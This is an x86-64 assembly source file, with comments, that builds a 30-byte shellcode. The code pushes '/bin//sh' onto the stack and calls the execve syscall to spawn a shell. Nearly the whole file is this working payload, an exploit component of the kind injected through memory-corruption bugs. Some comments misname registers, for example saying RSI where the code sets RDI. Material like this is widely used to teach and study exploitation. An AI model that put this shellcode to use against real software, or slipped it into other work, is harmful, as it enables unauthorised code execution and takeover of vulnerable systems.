; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
; 
; Description : This is a assembly code that genrates a shellcode which uses 'execve' syscall 
;				to spawn a new ("/bin/sh") shell.
;
; SHELLCODE LENGTH = 30 Bytes 



global _start


section .text
_start:
	
	; Syscall number for execve() syscall is 59, i.e. 0x3b
	xor rax, rax
	push rax				; PUSH a NULL onto stack

	; RSI should point to the string of "/bin//sh" which is pushed onto the stack
	mov	rbx, 0x68732f2f6e69622f
	push rbx				
	mov	rdi, rsp
	

	; RSI should store address where the address of string is stored (i.e. pointer to a pointer)
	push rax
	; PUSH RAX, i.e. 0x0000000000000000 onto the stack and store address of location that stores
	; 0x0000000000000000 into RDX (i.e. *envp[])  
	mov rdx, rsp	
	push rdi
	mov	rsi, rsp	


	mov al, 0x3b			; Syscall number - 59 (0x3b)
	
	syscall					; execve() syscall
